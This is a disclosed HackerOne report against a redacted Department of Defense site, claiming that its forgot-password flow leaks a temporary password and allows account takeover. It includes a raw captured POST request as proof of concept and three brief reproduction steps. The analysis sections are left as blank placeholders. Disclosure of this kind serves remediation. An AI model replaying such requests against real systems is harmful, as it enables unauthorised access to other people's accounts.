---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2194928'
original_report_id: '2194928'
title: Full account takeover of any user through reset password
weakness: Improper Authentication - Generic
team_handle: deptofdefense
created_at: '2023-10-05T17:49:51.130Z'
disclosed_at: '2023-11-17T18:10:47.096Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 61
tags:
- hackerone
- improper-authentication-generic
---

# Full account takeover of any user through reset password

## Metadata

- HackerOne Report ID: 2194928
- Weakness: Improper Authentication - Generic
- Program: deptofdefense
- Disclosed At: 2023-11-17T18:10:47.096Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team
I just checking this Url https://██████  and notice that when you request  to forget password ,website send temp password in forget password request 
my password in request is: ███
Poc:
```
POST /__852585b6003eba25.nsf/forgotpassword.html?OpenForm&Seq=1 HTTP/1.1
Host: www.██████
Cookie: _ga=GA1.2.1700054986.1696324867; _ga_CSLL4ZEK4L=GS1.1.1696324866.1.1.1696324913.0.0.0; _ga_YQMQPQYJ4J=GS1.1.1696324867.1.1.1696324913.0.0.0
Content-Length: 436
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://www.██████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.███████/852585B6003EBA25/forgotpassword.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

__Click=0&HTTP_HOST=www.██████████&HTTPS=ON&SERVER_NAME=www.████&%24DbPath=https%3A%2F%2Fwww.███████%2F852585B6003EBA25&████████&dbPath=https%3A%2F%2Fwww.█████%2F852585B6003EBA25&RepId=852585B6003EBA25&QUERY_STRING_DECODED=&eMailAddress=███.com&%25%25Surrogate_ChallengeQuestion=1&ChallengeQuestion=What+is+a+street+name+where+you+were+raised%3F&ChallengeAnswer=dez
```

## Impact

Full account takeover of any user through reset password

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1-request for forget password
2-capture request 
3- read password

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
